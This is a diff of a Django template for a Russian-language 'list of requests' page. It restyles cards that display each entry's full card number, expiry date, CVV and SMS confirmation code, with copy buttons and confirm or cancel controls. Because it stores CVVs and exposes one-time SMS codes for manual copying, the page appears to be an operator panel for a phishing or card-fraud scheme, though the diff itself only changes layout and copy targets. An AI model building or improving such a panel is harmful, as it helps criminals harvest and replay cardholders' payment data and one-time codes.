@@ -2,6 +2,7 @@
 {% extends 'base.html' %}
 {% block title %}Список заявок{% endblock %}
 {% load static %}
+{% load mathfilters %}
 
 {% block content %}
 
@@ -16,11 +17,21 @@
 <div class="container-fluid">
 <div class="row">
     {% for payment in page_obj %}
-    <div class="col-3">
-            <form method="post" action=''>
-            {% csrf_token %}
+    <div class="col-3 card" style="margin: 5px; background-color: #e0fff6">
+      <form method="post" action=''>
+      {% csrf_token %}
 
-        <div class="row">
+        <div class="row card-header" style="background-color:
+             {% if payment.counter|mod:4 == 0 %}
+                #f6b09e
+             {% elif payment.counter|mod:4 == 1 %}
+                 #cafdbb
+             {% elif payment.counter|mod:4 == 2 %}
+                 #a4bbf5
+             {% elif payment.counter|mod:4 == 3 %}
+                 #f6e79e
+             {% endif %}
+             ;">
             <div class="col-6">
                  № {{ payment.counter }}
             </div>
@@ -28,30 +39,32 @@
                  <button name="cancel_payment" value="{{ payment.id }}" style="margin-bottom: 0px; margin-top: -10px; height: 25px;font-size: small" type="submit" class="btn btn-danger btn-sm">X</button>
             </div>
         </div>
-        <div class="row" id="amount">
-             {{ payment.amount }}<div class="col-2"><img class="img-thumbnail" onclick="CopyToClipboard('cvv')"  src="{% static '/img/copy2.png' %}"></div>
-        </div>
-        <div class="row" id="card_number">
-             {{ payment.card_number }}<div class="col-2"><img class="img-thumbnail" onclick="CopyToClipboard('cvv')"  src="{% static '/img/copy2.png' %}"></div>
-        </div>
-        <div class="row" id="expired_month">
-            {% if payment.expired_month < 10 %}0{%  endif %}{{ payment.expired_month }}/{{ payment.expired_year }}<div class="col-2"><img class="img-thumbnail" onclick="CopyToClipboard('cvv')"  src="{% static '/img/copy2.png' %}"></div>
-        </div>
-        <div class="row" id="cvv">
-             {{ payment.cvv }}<div class="col-2"><img class="img-thumbnail" onclick="CopyToClipboard('cvv')"  src="{% static '/img/copy2.png' %}"></div>
-        </div>
-
-        <div class="row">
-            <div class="col-auto" id="sms_code">
-                 {{ payment.sms_code|default_if_none:"" }}
-
+        <div class="card-body" >
+            <div class="row" id="amount">
+                 {{ payment.amount }}<div class="col-2"><img class="img-thumbnail" onclick="CopyToClipboard('amount')"  src="{% static '/img/copy2.png' %}"></div>
             </div>
-            <div class="col-2"><img class="img-thumbnail" onclick="CopyToClipboard('sms_code')"  src="{% static '/img/copy2.png' %}"></div>
-                <div class="col-2">
-                 <button name="confirm_payment" value="{{ payment.id }}" style="margin-bottom: 0px; margin-top: -10px; height: 25px;font-size: small" type="submit" class="btn btn-success btn-sm">OK</button>
+            <div class="row" id="card_number">
+                 {{ payment.card_number }}<div class="col-2"><img class="img-thumbnail" onclick="CopyToClipboard('card_number')"  src="{% static '/img/copy2.png' %}"></div>
+            </div>
+            <div class="row" id="expired_month">
+                {% if payment.expired_month < 10 %}0{%  endif %}{{ payment.expired_month }}/{{ payment.expired_year }}<div class="col-2"><img class="img-thumbnail" onclick="CopyToClipboard('expired_month')"  src="{% static '/img/copy2.png' %}"></div>
+            </div>
+            <div class="row" id="cvv">
+                 {{ payment.cvv }}<div class="col-2"><img class="img-thumbnail" onclick="CopyToClipboard('cvv')"  src="{% static '/img/copy2.png' %}"></div>
+            </div>
+
+            <div class="row">
+                <div class="col-auto" id="sms_code">
+                     {{ payment.sms_code|default_if_none:"" }}
+
+                </div>
+                <div class="col-5"><img class="img-thumbnail" onclick="CopyToClipboard('sms_code')"  src="{% static '/img/copy2.png' %}"></div>
+                    <div class="col-2">
+                     <button name="confirm_payment" value="{{ payment.id }}" style="margin-bottom: 0px; margin-top: -10px; height: 25px;font-size: small" type="submit" class="btn btn-success btn-sm">OK</button>
+                </div>
             </div>
         </div>
-            </form>
+          </form>
     </div>
 
     {% endfor %}
